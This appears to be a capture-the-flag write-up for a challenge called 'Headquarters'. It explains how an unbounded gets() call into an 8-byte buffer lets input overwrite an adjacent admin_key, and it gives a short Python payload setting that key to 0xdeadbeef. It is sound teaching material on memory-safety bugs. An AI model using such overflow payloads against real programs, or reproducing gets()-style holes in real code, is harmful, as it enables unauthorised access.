# Headquarters

Refer to [`solve.py`](solve.py) for script.


## Vulnerability

`gets`, which is used to receive user input into the variable `name`, allows for input of an unlimited length.

That means even though the `char name[8]` variable has only a size of 8 bytes, when we do `gets(name)`, we can write more than 8 bytes.

This can lead to a buffer overflow vulnerability, where the amount of data written to the buffer (the variable) exceeds its storage capacity.

```
Reference page:
The gets() function does not perform bounds checking, therefore this function is extremely vulnerable to buffer-overflow attacks. It cannot be used safely (unless the program runs in an environment which restricts what can appear on stdin). For this reason, the function has been deprecated in the third corrigendum to the C99 standard and removed altogether in the C11 standard. fgets() and gets_s() are the recommended replacements.
```

## Exploit

This is how the stack looks like:

```
top of stack
----------------
| char name[8] | < 8 bytes
---------------- 
|  admin_key   | < 4 bytes
----------------
bottom of stack
```

That means if we input more than 8 characters as input, we can overflow into the `admin_key` variable, and modify its value.
- E.g. if we input 12 `A`s, then `admin_key = AAAA (0x41414141)`.

So, to make `admin_key = 0xdeadbeef`, we need this to be our payload:

```python
payload = b'A'*8 # fill up the `name` buffer
payload += p32(0xdeadbeef) # overwrite `admin_key` to 0xdeadbeef. p32 formats our value to 4 bytes LSB.

io.sendline(payload) # get the flag
```
